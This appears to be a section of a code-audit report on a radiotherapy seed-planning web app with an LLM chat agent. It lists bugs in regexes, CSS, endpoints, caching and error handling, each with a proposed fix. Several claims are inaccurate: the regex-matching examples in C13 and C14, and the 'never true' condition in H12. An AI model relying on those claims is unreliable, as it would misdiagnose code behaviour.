**Problem:** The expression mixes `&&` and `||` without parentheses. In JavaScript, `&&` has higher precedence than `||`, so the logic evaluates incorrectly:

```javascript
const isFullPlan = /规划|execute|plan|运行|.../i.test(text)
    && /放射性|粒子|植入|.../i.test(text)
    || /规划/.test(text)         // ← Third term (AFTER &&, so || applies here)
    || /planning/i.test(text)
    || /规划/.test(text);        // ← Duplicate of /规划/
```

Due to precedence: `isFullPlan = (A && B) || C || D || C` where:
- A = broad execution keywords
- B = anatomy/disease keywords  
- C = `/规划/` test (any text with the character 规 or 划)
- D = `/planning/` test

The intent was `(A && B) || (C || D)`, but the actual evaluation `(A && B) || C || D || C` means that ANY text containing the single character "规" or "划" triggers full plan detection, even if the user is asking a knowledge question like "请解释治疗规划的基本原理" (Please explain the basic principles of treatment planning).

**Impact:** Many innocent Chinese sentences containing "规划" (planning) as a noun are misinterpreted as full-plan execution requests. The user asks for information, but the system runs a full treatment plan instead. This wastes compute time and frustrates the user.

**Fix:** Wrap the terms in proper precedence:
```javascript
const isFullPlan = (/规划|execute|plan|运行|.../i.test(text)
    && /放射性|粒子|植入|.../i.test(text))
    || /^规划$/i.test(text)
    || /^planning$/i.test(text);
```

---

## C14. `_isAdviceRequest` overly broad regex

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-chat-todo.js` |
| **Line** | 697-700 |
| **Severity** | CRITICAL — normal messages mistakenly routed to advice generation |

**Problem:** The word "review" and "plan" appear in the advice-detection regex, but these are common words in normal conversation:

```javascript
return /(?:advice|suggest|review|improve|优化|建议|评价|哪里|怎么调|如何调整|详细建议|规划评价)/i.test(text || '')
    && /(?:plan|planning|dose|seed|needle|CTV|OAR|规划|剂量|粒子|穿刺针|靶区|危及器官)/i.test(text || '');
```

A user message like:
- "Let me review the CT images first" → matches "review" in group 1 and "CTV" in group 2 → triggers advice flow
- "I plan to upload the DICOM series" → matches "plan" in group 1 and "planning" in group 2 → triggers advice flow

**Impact:** Normal conversational messages about reviewing data or planning next steps are intercepted and routed to `requestPlanningAdvice()` which generates unsolicited plan feedback, confusing the user and potentially overwriting the conversation context.

**Fix:** Add more specific context checks (e.g., require "advice" or "review" to appear near a planning keyword within a short window, not just anywhere in the text):
```javascript
const text_lower = (text || '').toLowerCase();
const has_advice_keyword = /\b(advice|suggest|improve|评价|优化)\b/i.test(text_lower);
const has_plan_context = /\b(plan|dose|seed|CTV|OAR|剂量|粒子)\b/i.test(text_lower);
return has_advice_keyword && has_plan_context;
```

---

## C15. `/api/export/stl` saves `.npy` files, not STL

| Field | Value |
|-------|-------|
| **File** | `web/routes/planning_routes.py` |
| **Line** | 1564-1565 |
| **Severity** | CRITICAL — endpoint name completely misrepresents output format |

**Problem:** The endpoint `/api/export/stl` claims to export STL files (Standard Triangle Language, the standard 3D printing format), but the implementation saves NumPy `.npy` files:

```python
# planning_routes.py:1564-1565
np.save(os.path.join(safe_output_dir, f"seed_{i}_{j}_pos.npy"), pos)
np.save(os.path.join(safe_output_dir, f"seed_{i}_{j}_dir.npy"), direc)
```

The docstring says "Export seed positions as STL files" but the code doesn't use `numpy-stl`, `trimesh`, or any STL library. It saves raw NumPy arrays.

**Impact:** Any user or downstream tool expecting standard STL files receives unreadable `.npy` files. The endpoint is effectively useless for 3D printing or mesh viewing.

**Fix:** Rename the endpoint to `/api/export/seed_positions` or implement actual STL export:
```python
# Option A: rename
@app.route("/api/export/seed_positions", methods=["POST"])

# Option B: implement STL
from stl import mesh
stl_mesh = mesh.Mesh(np.zeros(len(points), dtype=mesh.Mesh.dtype))
for i, (pos, direc) in enumerate(zip(points, directions)):
    stl_mesh.vectors[i] = ...  # build triangular mesh for each seed
stl_mesh.save(os.path.join(safe_output_dir, "seeds.stl"))
```

---

## C16. `.step-num` class undefined in CSS — used 7 times in HTML

| Field | Value |
|-------|-------|
| **File** | `web/app/` HTML (7 occurrences) + all 4 CSS files |
| **Severity** | CRITICAL — step number badges render unstyled |

**Problem:** The HTML template uses `<span class="step-num">N</span>` in 7 places to show step numbers in the planning workflow tabs (e.g., `"0"` next to CTV Seg, `"1"` next to OAR Seg, etc.). However, no `.step-num` CSS class is defined in any of the 4 CSS files:

```html
<!-- HTML uses step-num in multiple places: -->
<span class="step-num">0</span> CTV Seg
<span class="step-num">1</span> OAR Seg
<span class="step-num">2</span> Trajectory Init
<span class="step-num">3</span> Seed Planning
<span class="step-num">4</span> Dose Calc
<span class="step-num">5</span> Dose Eval
```

These render as plain inline text with the browser's default font and size — no circular badge, no background, no proper alignment. They look like unformatted plain numbers, not step indicators.

**Impact:** The planning workflow visualization is broken — step numbers appear as unformatted text rather than the intended circular badge design. Users cannot easily distinguish step indicators from other text.

**Fix:** Add to any CSS file (e.g., `brachybot-panels-viewers.css`):
```css
.step-num {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 20px;
    height: 20px;
    border-radius: 50%;
    background: var(--primary, #3b82f6);
    color: #fff;
    font-size: 0.7rem;
    font-weight: 700;
    margin-right: 4px;
}
```

---

## C17. Orphan CSS declaration after prematurely closed block

| Field | Value |
|-------|-------|
| **File** | `web/app/static/css/brachybot-chat-status.css` |
| **Line** | 1027-1032 |
| **Severity** | CRITICAL — CSS properties never applied |

**Problem:** A closing brace `}` at the end of line 1028 terminates the `.usage-value` block prematurely. The properties on lines 1029-1032 (`color: var(--primary); font-weight: 600; font-variant-numeric: tabular-nums; font-family: 'JetBrains Mono', monospace;`) become orphan declarations with no selector — the browser ignores them:

```css
/* Line 1027-1032 */
.usage-value {
    font-feature-settings: "tnum" 1;
}                              /* ← This brace closes .usage-value */
color: var(--primary);         /* ← ORPHAN — no selector */
font-weight: 600;              /* ← ORPHAN */
font-variant-numeric: tabular-nums;  /* ← ORPHAN */
font-family: 'JetBrains Mono', monospace;  /* ← ORPHAN */
}                              /* ← Unmatched closing brace */
```

**Impact:** The primary color and monospace font intended for `.usage-value` are never applied. Usage statistics in the status panel render in the default body font/color instead of the intended highlighted design.

**Fix:** Move the closing brace to after all declarations:
```css
.usage-value {
    font-feature-settings: "tnum" 1;
    color: var(--primary);
    font-weight: 600;
    font-variant-numeric: tabular-nums;
    font-family: 'JetBrains Mono', monospace;
}
```

---

## C18. `.metric-card.warn` duplicate `border` — warning border invisible

| Field | Value |
|-------|-------|
| **File** | `web/app/static/css/brachybot-panels-viewers.css` |
| **Line** | 499-500 |
| **Severity** | CRITICAL — warning state has no visible border |

**Problem:** The `.metric-card.warn` selector has `border` declared twice in the same block. The second declaration overrides the first, making the warning border transparent:

```css
/* panels-viewers.css:499-500 */
.metric-card.warn {
    background: rgba(245, 158, 11, 0.2);
    border: 1px solid rgba(245, 158, 11, 0.5);  /* ← Intended warn border (amber) */
    border: 1px solid transparent;                /* ← Overrides to invisible! */
    ...
}
```

Compare with `.metric-card.pass` (line 504-505) which correctly has `border: 1px solid rgba(16, 185, 129, 0.5)` — a single declaration.

**Impact:** When a clinical metric fails a warning threshold, the metric card shows only an amber background with NO colored border. The visual distinction between "pass" (green border), "warn" (should be amber border), and "fail" (red border) is lost for moderate warnings. The amber border is present in the source but invisible because `transparent` overrides it.

**Fix:** Remove the redundant `transparent` border:
```css
.metric-card.warn {
    background: rgba(245, 158, 11, 0.2);
    border: 1px solid rgba(245, 158, 11, 0.5);
    ...
}
```

---

# HIGH (22)

---

## H1. `_record_experience` crashes when `_init_self_evolution` fails

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py:420-432` (init), `agent_runtime/chat_workflows.py:1469` (usage) |
| **Severity** | HIGH — unhandled AttributeError breaks chat loop |

**Problem:** `_init_self_evolution()` sets `self.evolution_engine = None` before the try block. But the `except` handler (lines 431-432) only logs a warning and does NOT set `self.exp_memory = None`. If the import of `ExperienceMemory` fails (e.g., missing dependency, broken import), `self.exp_memory` attribute is never assigned to the instance.

```python
# AgenticSys.py:420-432
def _init_self_evolution(self):
    self.evolution_engine = None
    try:
        from memory import ExperienceMemory, SelfEvolutionEngine
        self.exp_memory = ExperienceMemory(session_id=self.memory.session_id)
        self.evolution_engine = SelfEvolutionEngine(experience_memory=self.exp_memory, ...)
    except Exception as e:
        logger.warning(f"Self-evolution system not available: {e}")
        # ← self.exp_memory is NEVER set here!
```

Then at `chat_workflows.py:1469`:
```python
def _record_experience(self, ...):
    if not self.exp_memory:     # ← AttributeError! self.exp_memory doesn't exist
        return
```

Compare with `get_status()` at line 1941 which correctly uses `getattr`:
```python
status["experiences"] = self.exp_memory.get_summary()
# ↓ is guarded:
if getattr(self, "exp_memory", None):
```

**Impact:** If the `memory` module import fails for any reason, every user message triggers `AttributeError` in `_record_experience`, breaking the chat loop entirely. Recovery requires server restart.

**Fix:** Add `self.exp_memory = None` in the except block:
```python
except Exception as e:
    logger.warning(f"Self-evolution system not available: {e}")
    self.exp_memory = None  # ← ADD THIS
```

---

## H2. Invalid CSS `font-family` syntax

| Field | Value |
|-------|-------|
| **File** | `web/app/static/css/brachybot-theme-layout.css` |
| **Line** | 396 |
| **Severity** | HIGH — lang-toggle buttons never use Inter font |

**Problem:** The `.lang-btn` rule wraps the entire font-family value including the comma and fallback in single quotes. CSS interprets this as a literal font name `Inter, sans-serif` (with comma), which never matches any installed font:

```css
/* Line 396 — WRONG */
.lang-btn {
    font-family: 'Inter, sans-serif';  /* Looks for font named "Inter, sans-serif" */
    ...
}
```

Compare with correct usage elsewhere in the same file:
```css
/* Line 254 — CORRECT */
font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;

/* Line 333 — CORRECT */
font-family: 'Space Grotesk', sans-serif;
```

**Impact:** The language toggle buttons (EN/中) inherit whatever font the parent element uses, instead of using `Inter` as intended. This is a visual inconsistency — the language toggle buttons don't match the typography of the rest of the header.

**Fix:** Move the quote before the comma:
```css
.lang-btn {
    font-family: 'Inter', sans-serif;
}
```

---

## H3. Missing `_cancelled()` check at streaming loop top

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py` |
| **Line** | 1286 |
| **Severity** | HIGH — user cancel ignored between LLM rounds |

**Problem:** The non-streaming `_run_llm_function_calling` checks `_cancelled()` at every iteration top (line 338). The streaming `_run_llm_function_calling_stream` starts its while loop at line 1286 WITHOUT this check — cancel is only checked inside the tool execution sub-loop (line 1541):

```python
# Non-stream (line 338) — checks cancel at loop top:
while not self._cancelled():
    ...

# Stream (line 1286) — NO cancel check at loop top:
while True:
    # ... the cancel check at line 1541 is inside the tool processing block,
    # NOT at the top of the LLM iteration loop
```

**Impact:** If a user clicks "Cancel" between LLM call rounds (after tool results return but before the next LLM call), the streaming version doesn't detect it and proceeds to call the LLM again. The user sees the system continuing despite their cancel request.

**Fix:** Add `if self._cancelled(): break` at the top of the streaming while loop:
```python
while True:
    if self._cancelled():
        logger.info("Stream cancelled by user")
        yield_event("done", {"final": str("Cancelled")})
        return
    ...
```

---

## H4. Inconsistent CT-loaded gate: stream vs non-stream

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py:438` vs `:1314-1316` |
| **Severity** | HIGH — stream version ignores CT in agent memory |

**Problem:** The non-streaming version checks TWO conditions: UI state AND agent memory:

```python
# Non-stream (line 438):
_no_files_loaded = not AgentMemory.is_ct_loaded(ui_state_for_override) and not _ct_in_memory
#                                      ↑ UI state check       ↑ agent memory check
```

The streaming version checks ONLY the UI state:

```python
# Stream (line 1314-1316):
ct_loaded = AgentMemory.is_ct_loaded(ui_state)
#           ↑ UI state check ONLY
```

`AgentMemory.is_ct_loaded()` only inspects the UI state object (derived from `conversation_state`), NOT `self.memory.retrieve("ct_image")`. If CT data is in agent memory but the UI state says not loaded (e.g., after a page refresh), the streaming version blocks CT-dependent tools while the non-streaming version allows them.

**Impact:** In streaming mode, after a page refresh, the system falsely believes no CT is loaded and prevents CT-related tool calls (segmentation, planning). The non-streaming path would correctly allow them because it also checks agent memory.

**Fix:** Mirror the non-streaming logic:
```python
ct_loaded = AgentMemory.is_ct_loaded(ui_state) or self.memory.retrieve("ct_image") is not None
```

---

## H5. Bare `except:` catches `KeyboardInterrupt` / `SystemExit`

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py` |
| **Line** | 1670 |
| **Severity** | HIGH — process cannot be killed with Ctrl+C during dict sanitization |

**Problem:** A bare `except:` without exception type catches all exceptions including `KeyboardInterrupt` and `SystemExit`. This makes the process unresponsive to Ctrl+C:

```python
# AgenticSys.py:1670
except:     # ← Bare except: catches KeyboardInterrupt and SystemExit
    sanitized[key] = f"<{type(value).__name__} with {len(value)} items>"
```

Python exceptions like `KeyboardInterrupt` and `SystemExit` should almost never be caught by bare `except:` clauses. They're intended to propagate and terminate the process.

**Impact:** If a user presses Ctrl+C while `_sanitize_for_json` is processing a large memory object (e.g., a large numpy array dump in the conversation), the process hangs because the bare except catches the interrupt. The user must use `kill -9` to terminate.

**Fix:** Use `except Exception:` instead:
```python
except Exception:
    sanitized[key] = f"<{type(value).__name__} with {len(value)} items>"
```

---

## H6. Inline path validation bypasses centralized `_validate_path`

| Field | Value |
|-------|-------|
| **File** | `web/server.py` |
| **Line** | 261-275 (`api_viewer_image`) |
| **Severity** | HIGH — env var expansion silently ignored for this endpoint |

**Problem:** `api_viewer_image` validates the path using a hardcoded `startswith` check instead of the shared `_validate_path()` function:

```python
# server.py:272-275 — inline validation, not _validate_path():
upload_dir = os.path.realpath(os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "uploads"
))
if not image_path.startswith(upload_dir + os.sep):
    return jsonify({"error": "Access denied"}), 403
```

This bypasses the `_validate_path` function in `server_support.py:879` which also checks:
- Resolved symlinks
- `BRACHYBOT_DATA_ROOTS` environment variable (allowing additional data directories)
- `..` path component traversal

**Impact:** Users who have configured `BRACHYBOT_DATA_ROOTS` to include directories outside the default `uploads/` path cannot use `api_viewer_image` to view images from those directories. All other endpoints respect this env var, but this one doesn't. This also means the path traversal protection is weaker — the inline check doesn't resolve symlinks.

**Fix:** Use the shared `_validate_path()` function:
```python
from web.server_support import _validate_path
...
if not _validate_path(image_path, purpose="read"):
    return jsonify({"error": "Access denied"}), 403
```

---

## H7. No 413 (Request Entity Too Large) JSON error handler

| Field | Value |
|-------|-------|
| **File** | `web/server.py:83` |
| **Severity** | HIGH — client gets HTML instead of JSON on large uploads |

**Problem:** `MAX_CONTENT_LENGTH = 500 * 1024 * 1024` (500MB) is set, but Flask's default 413 error handler returns an HTML page instead of JSON:

```python
# server.py:83
app.config["MAX_CONTENT_LENGTH"] = 500 * 1024 * 1024  # 500MB max upload
```

Flask's built-in 413 handler returns `text/html`:
```html
<!DOCTYPE HTML PUBLIC ...>
<title>413 Request Entity Too Large</title>
<h1>Request Entity Too Large</h1>
```

**Impact:** Any client sending a request larger than 500MB receives HTML instead of JSON, which breaks the frontend's JSON parsing (`r.json()` throws, the catch block shows a generic error instead of a meaningful message like "File too large").

**Fix:** Add a custom 413 error handler:
```python
@app.errorhandler(413)
def request_entity_too_large(e):
    return jsonify({"error": "File too large. Maximum upload size is 500MB."}), 413
```

---

## H8. `DOSE_SCALE = 120.0` defined 5× across the codebase

| Field | Value |
|-------|-------|
| **File** | `tool_factory/seed_plan/planning_pipeline.py` (4×), `web/server_support.py` (1×) |
| **Line** | 1249, 1383, 1431, 1488 (planning_pipeline), 70 (server_support) |
| **Severity** | HIGH — dose scale change requires 5 edits |

**Problem:** The magic number `120.0` (dose model output → Gy conversion factor) is copy-pasted in 5 separate locations:

```python
# planning_pipeline.py:1249
DOSE_SCALE = 120.0     # in method A

# planning_pipeline.py:1383
DOSE_SCALE = 120.0     # in method B (same value, different scope)

# planning_pipeline.py:1431
DOSE_SCALE = 120.0     # in method C

# planning_pipeline.py:1488
DOSE_SCALE = 120.0     # in method D

# server_support.py:70
DOSE_MODEL_SCALE_GY = 120.0  # web side
```

**Impact:** If the dose model calibration changes and `120.0` needs to be updated to a different scale, a developer must find and update all 5 locations. If even one is missed, some parts of the system will produce incorrect dose values while others are correct, leading to inconsistent clinical metrics.

**Fix:** Define the constant in one canonical location and import it everywhere else:
```python
# In config/__init__.py or dose_config.py:
DOSE_MODEL_SCALE_GY = 120.0

# In planning_pipeline.py:
from config import DOSE_MODEL_SCALE_GY

# In server_support.py:
from config import DOSE_MODEL_SCALE_GY
```

---

## H9. Missing `anthropic` SDK in `requirements.txt`

| Field | Value |
|-------|-------|
| **File** | `requirements.txt` |
| **Severity** | HIGH — Claude/Anthropic provider won't work on fresh install |

**Problem:** The code references Anthropic API environment variables:
```python
# brachybot.py:110-111
_anthropic_key = os.environ.get("ANTHROPIC_AUTH_TOKEN", "") or os.environ.get("ANTHROPIC_API_KEY", "")
```

And `brain/providers/` likely contains an Anthropic LLM provider. However, `requirements.txt` does not list `anthropic` (the official Anthropic Python SDK). A fresh `pip install -r requirements.txt` will not install the SDK needed for Anthropic/Claude model support.

Also missing from `requirements.txt`:
- `pytest-asyncio` (needed by all `async` tests)
- `python-multipart` (Flask may need this for file upload parsing)
- `playwright` (used by debug test scripts)

**Impact:** Developers who clone the repo and install dependencies via `requirements.txt` will find that Anthropic/Claude provider fails with `ModuleNotFoundError`, and `pytest` fails on async tests.

**Fix:** Add missing dependencies:
```
anthropic>=0.30.0
pytest-asyncio>=0.21.0
python-multipart>=0.0.6
```

---

## H10. Stale worktrees with divergent pre-modernization code

| Field | Value |
|-------|-------|
| **File** | `.claude/worktrees/benchmark-optimization/`, `datamind-report/`, `ui-design-fixes/` |
| **Severity** | HIGH — worktrees contain full old codebase copies |

**Problem:** Three worktrees exist under `.claude/worktrees/`, each containing a FULL copy of the pre-modularization codebase including:
- Old monolithic `AgenticSys.py` (8300+ lines)
- Old monolithic `web/server.py` (5100+ lines)
- Old monolithic `web/app/index.html` (24000+ lines)
- Duplicate copies of `tests/test_brain_system.py` and `conftest.py`

These copies can diverge from the main project. If someone runs tests in a worktree, they're testing the OLD architecture, not the new modularized code.

**Impact:** Developers may unknowingly work on or test against the old monolithic code. Divergent test results between worktree and main project can mask regressions. The worktree's stale import paths may cause confusion.

**Fix:** Either: (a) remove stale worktrees after confirming no in-progress work, or (b) update worktrees to reflect the new modular structure.

---

## H11. `_parse_tool_calls` — fragile single-quote substitution corrupts strings

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/chat_workflows.py` |
| **Line** | 73 |
| **Severity** | HIGH — JSON parsing fails for tool calls with apostrophes |

**Problem:** The code blindly replaces ALL single quotes with double quotes to convert Python-style dicts to JSON:

```python
# chat_workflows.py:73
raw = py_tool_use.group(0).replace("'", '"')
```

This corrupts any string that contains an apostrophe. For example, if the LLM emits:
```python
{'name': "user's input", 'args': '{"key": "value"}'}
```

After replacement:
```python
{"name": "user"s input", "args": "{"key": "value"}"}
```

This is invalid JSON — `user"s` is unquoted text after the internal quote, and the JSON-like string `{"key": "value"}` also has its quotes corrupted.

**Impact:** Any LLM tool call that includes an apostrophe in a parameter value (e.g., a patient name like "O'Brien", a clinical finding like "patient's response") will fail to parse. This causes the tool call to be silently dropped or raise `json.JSONDecodeError`. The LLM may not get feedback about why its tool call failed.

**Fix:** Use a more sophisticated approach that only replaces quote delimiters, not internal quotes:
```python
import ast
try:
    # Try parsing as Python dict literal first
    parsed = ast.literal_eval(raw)
    raw = json.dumps(parsed)
except (SyntaxError, ValueError):
    # Fall back to single-quote replacement with validation
    ...
```

---

## H12. `_clean_response_text` — dead condition and 3× redundant pattern

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py:759-885` |
| **Severity** | HIGH — duplicate condition never true; same pattern matched 3× |

**Problem:** Two issues in `_clean_response_text`:

1. **Dead condition** (line 803-804):
```python
if response_text.startswith(" ") or ('tool_use' in stripped or 'tool_use' in stripped):
```
   The right side of the `or` is `'tool_use' in stripped OR 'tool_use' in stripped` — identical expressions. The second check is always redundant.

2. **Same pattern matched 3× with increasing greediness** (lines 812, 830, 835, 837, 839):
```python
# Line 812:    ```tool_call { ... }```
# Line 830:    ```tool_call(.*?)``` — non-greedy
# Line 835:    ```tool_call(.*)``` — greedy (subsumes lines 812 and 830)
# Line 837:    tool_use { ... }
# Line 839:    tool_use (.*?) — non-greedy
```

The greedy pattern at line 835 subsumes the non-greedy patterns at 812 and 830, making them unreachable dead code.

**Impact:** Code is confusing to read and maintain. If someone modifies the greedy pattern at line 835, they may not realize they also need to update the dead patterns at lines 812 and 830. The `or ... or ...` duplicate at 803-804 suggests a copy-paste error.

**Fix:** Remove the duplicate condition and consolidate the regex patterns:
```python
# Remove line 804 (duplicate 'tool_use' in stripped condition)
# Consolidate lines 812-839 into focused patterns:
CLEANUP_PATTERNS = [
    (r'```tool_call\s*\{(.*?)\}\s*```', r'\1'),  # tool_call block → content
    (r'tool_use\s*\{', '{'),                       # tool_use prefix → plain
]
for pattern, replacement in CLEANUP_PATTERNS:
    response_text = re.sub(pattern, replacement, response_text, flags=re.DOTALL)
```

---

## H13. Duplicate DICOM export endpoints — near-identical logic

| Field | Value |
|-------|-------|
| **File** | `web/routes/planning_routes.py` |
| **Line** | 1479 (`/api/export/dicom_rt`), 1742 (`/api/export/dicom`) |
| **Severity** | HIGH — same logic duplicated, maintenance risk |

**Problem:** Two endpoints with different paths but nearly identical DICOM-RT export logic:

| Aspect | `/api/export/dicom_rt` (line 1479) | `/api/export/dicom` (line 1742) |
|--------|-----------------------------------|--------------------------------|
| Path validation | Yes (`_validate_path`) | Only validates output dir |
| File structure | Output path from form data | Fixed `output/dicom_export/` |
| Registration | Via `register_planning_routes` | Directly in server.py's `create_app` |
| 3D viewer context | Passes `state.coronal/sagittal/axial` | All empty strings |

The second endpoint at line 1742 was likely created for a specific frontend workflow but duplicates ~60 lines of code from the first.

**Impact:** If a DICOM export bug is fixed in one endpoint, the fix must be manually applied to the other. The two will inevitably diverge over time. The second endpoint also doesn't validate input paths, so it may have weaker security.

**Fix:** Consolidate into one endpoint with optional parameters for the different behaviors:
```python
@app.route("/api/export/dicom", methods=["POST"])
def api_export_dicom():
    return _export_dicom(use_form_config=False)

@app.route("/api/export/dicom_rt", methods=["POST"])
def api_export_dicom_rt():
    return _export_dicom(use_form_config=True)

def _export_dicom(use_form_config: bool):
    # Common logic
```

---

## H14. `int16` overflow risk in CT data conversion

| Field | Value |
|-------|-------|
| **File** | `web/routes/viewer_routes.py` |
| **Line** | 280 |
| **Severity** | HIGH — HU values >32767 silently truncated |

**Problem:** CT data is cast to `np.int16` without clipping:

```python
# viewer_routes.py:280
ct_int16 = ct_data.astype(np.int16)
```

`np.int16` range is -32768 to 32767. Hounsfield units typically range from -1024 to ~3000, which fits. However:
- DICOM raw pixel values can be 12-bit or 16-bit unsigned (0-4095 or 0-65535)
- If the CT data contains raw pixel values (not yet converted to HU), values >32767 overflow to negative
- Some CT scanners use extended Hounsfield scales (e.g., for metal artifact reduction)

When `ct_int16` overflows:
- Value 32768 becomes -32768
- Value 40000 becomes -25536
- This creates severe image artifacts

**Impact:** CT images with raw pixel values >32767 will display with incorrect densities (bright structures appear dark due to overflow), potentially masking or simulating pathology.

**Fix:** Clip before casting:
```python
ct_int16 = np.clip(ct_data, -32768, 32767).astype(np.int16)
```
Or use `np.int32`:
```python
ct_int32 = ct_data.astype(np.int32)
```

---

## H15. `list.pop(0)` O(n) cache eviction — unnecessary latency under lock

| Field | Value |
|-------|-------|
| **File** | `web/routes/viewer_routes.py` |
| **Line** | 964 |
| **Severity** | HIGH — cache eviction shifts ~48 elements on average per call |

**Problem:** The mesh cache eviction uses `list.pop(0)` which is O(n):

```python
# viewer_routes.py:964
_MESH_CACHE_ORDER.pop(0)    # ← O(n): shifts all remaining elements
```

For a cache of 96 items, `_MESH_CACHE_MAX_ITEMS`, `pop(0)` shifts ~48 elements on average. This runs under `_MESH_CACHE_LOCK`, so it blocks all other cache operations during the shift.

**Impact:** Under concurrent requests (e.g., a user rotating a 3D view that loads many mesh slices), cache evictions cause lock contention. The O(n) memory shift is pure overhead for a data structure that could be O(1).

**Fix:** Use `collections.deque` which has O(1) `popleft()`:
```python
from collections import deque

_MESH_CACHE_ORDER: deque = deque()

# Append:
_MESH_CACHE_ORDER.append(cache_key)

# Evict:
old_key = _MESH_CACHE_ORDER.popleft()  # O(1)
```

---

## H16. Import inside loop — executed for every unique OAR label

| Field | Value |
|-------|-------|
| **File** | `web/routes/viewer_routes.py` |
| **Line** | 610-616 |
| **Severity** | HIGH — 100× import cost per request |

**Problem:** The import is inside a `for` loop over unique OAR labels:

```python
# viewer_routes.py:610-616
for label in unique_labels:
    if label > 0:
        ...
        try:
            from tool_factory.OAR_seg.totalsegmentator_oar import TOTALSEG_LABEL_MAPPING
            organ_names_generated[label_int] = TOTALSEG_LABEL_MAPPING.get(label_int, ...)
        except ImportError:
            ...
```

If `oar_array` has 100 unique labels (common for TotalSegmentator output with 104+ organ classes), the import executes 100 times. Python caches imports after the first execution, so each subsequent "import" is just a `sys.modules` dict lookup — not disk I/O, but still ~100 unnecessary function calls per request.

**Impact:** Unnecessary latency on every OAR label loading request. The import is inside a `try` block, so an `ImportError` is caught 100 times instead of once.

**Fix:** Move the import to module level or outside the loop:
```python
# At module level:
try:
    from tool_factory.OAR_seg.totalsegmentator_oar import TOTALSEG_LABEL_MAPPING
    _HAS_TOTALSEG = True
except ImportError:
    _HAS_TOTALSEG = False
    TOTALSEG_LABEL_MAPPING = {}

# Inside the loop:
if _HAS_TOTALSEG:
    organ_names_generated[label_int] = TOTALSEG_LABEL_MAPPING.get(label_int, ...)
```

---

## H17. Dual `renderDoseOverlay` implementations — maintenance divergence risk

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-3d-manual.js` |
| **Line** | 2046 (old), 1997 (new) |
| **Severity** | HIGH — two versions of same logic; one may become stale |

**Problem:** Two different implementations of the same dose overlay rendering logic:

1. **`renderDoseOverlay(axis, sliceIndex, sliceData)`** (line 2046) — renders directly onto the CT slice canvas
2. **`renderDoseOverlayOnLayer(doseCanvas, axis, sliceIndex, sliceData)`** (line 1997) — renders onto a separate overlay canvas layer

Both take the same core parameters and produce the same visual output. The only difference is the canvas target. Currently `renderDoseOverlay` appears unused — all new code uses `renderDoseOverlayOnLayer` via `renderDoseForCurrentSlice`.

**Impact:** If someone fixes a dose rendering bug (e.g., color mapping, contour alignment) in one implementation, the other retains the old buggy code. When `renderDoseOverlay` is eventually revived (or vice versa), the bug reappears.

**Fix:** Remove the unused implementation (`renderDoseOverlay`) and route all callers through `renderDoseOverlayOnLayer`:
```javascript
// Keep only one:
function renderDoseOverlayOnLayer(doseCanvas, axis, sliceIndex, sliceData) { ... }
// Remove: function renderDoseOverlay(axis, sliceIndex, sliceData) { ... }
```

---

## H18. `contour.level.toFixed(1)` without null check

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-3d-manual.js` |
| **Line** | 2293 |
| **Severity** | HIGH — `TypeError` if contour level is undefined |

**Problem:** `contour.level` is accessed and called with `.toFixed()` without checking if it exists:

```javascript
// 3d-manual.js:2293
const label = contour.level.toFixed(1);
```

Earlier in the function (line 2245), there's a guard:
```javascript
const level = contour.level || contour.level_rel;
```

But this does NOT prevent accessing `contour.level` directly at line 2280 and 2293. If the server returns contour data without a `level` field (only `level_rel`), `contour.level` is `undefined`, and `undefined.toFixed(1)` throws `TypeError: Cannot read properties of undefined`.

```javascript
// Line 2280:
const level = contour.level || contour.level_rel;    // level is now contour.level_rel

// Line 2293:
const label = contour.level.toFixed(1);               // ← Uses contour.level, NOT the local `level`!
```

**Impact:** If the server returns dose contour data with `level_rel` but without `level`, the 3D dose overlay rendering crashes with `TypeError`. The user sees a blank 3D view instead of dose contours.

**Fix:** Use the local `level` variable, not `contour.level`:
```javascript
const label = (level || 0).toFixed(1);
```

---

## H19. Dual language globals `_uiLanguage` vs `_i18nLang` — inconsistency

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-chat-core.js` |
| **Line** | 900 (`_uiLanguage`), 1165 (`_i18nLang`) |
| **Severity** | HIGH — some UI parts show Chinese while others show English |

**Problem:** Two parallel language tracking systems with different sources:

```javascript
// chat-core.js:900 — set by SSE start event (SERVER-detected language)
window._uiLanguage = data.language.code;

// chat-core.js:1165 — set by global UI toggle (USER preference)
window._i18nLang = getInitialLang();  // from localStorage
```

Different functions check different globals:
| Function | Uses | Source |
|----------|------|--------|
| `_footerI18n()` (line 443) | `window._uiLanguage` | Server-detected |
| `_chainI18n()` (line 714) | `window._uiLanguage || window._i18nLang` | Either |
| `window._t()` (line 1214) | `window._i18nLang` | User preference |
| `updateImageAnalysis()` | `window._i18nLang` | User preference |

**Example scenario:**
1. User types in Chinese → server detects Chinese → `_uiLanguage = 'zh'`
2. User clicks EN button → `_i18nLang = 'en'`
3. Footer text sees 'zh' (Chinese), report strings see 'en' (English), chain text sees 'zh' (first match)

**Impact:** Users experience a mixed-language UI where some parts (footer, step chain) show Chinese while other parts (reports, static labels) show English. This is confusing and unprofessional.

**Fix:** Consolidate to a single source of truth:
```javascript
// Single function, single global:
function getEffectiveLanguage() {
    return window._i18nLang || window._uiLanguage || 'en';
}
```

Replace all `window._uiLanguage` and `window._i18nLang` checks with `getEffectiveLanguage()`.

---

## H20. `_MESH_CACHE` key uses `id(mask_data)` — memory address collision risk

| Field | Value |
|-------|-------|
| **File** | `web/routes/viewer_routes.py` |
| **Line** | 861 |
| **Severity** | HIGH — stale cache hit if old memory address is reused |

**Problem:** The cache key uses Python's `id()` which returns the memory address of the object:

```python
# viewer_routes.py:861
cache_key = (source, label_id, str(smoothing_key), id(mask_data), mask_shape_key, total_voxels)
```

`id(mask_data)` returns the CPython memory address of the `mask_data` numpy array. If that array is garbage-collected and a new array is allocated at the same address (highly likely on a busy server), the cache returns stale mesh data for a semantically different input.

